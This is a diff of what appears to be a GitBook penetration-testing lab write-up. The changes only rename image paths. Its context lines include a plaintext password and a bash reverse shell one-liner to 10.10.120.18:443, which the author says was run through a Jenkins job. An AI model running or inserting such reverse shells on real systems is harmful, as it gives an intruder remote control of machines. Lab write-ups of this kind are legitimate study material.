@@ -223,7 +223,7 @@ Password: spongebob
 
 ### Jenkins Web
 
-<figure><img src="../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (13) (4).png" alt=""><figcaption></figcaption></figure>
 
@@ -233,7 +233,7 @@ Just added a reverse shell to the job and ran it.
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.120.18/443 0>&1'
 ```
 
-<figure><img src="../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
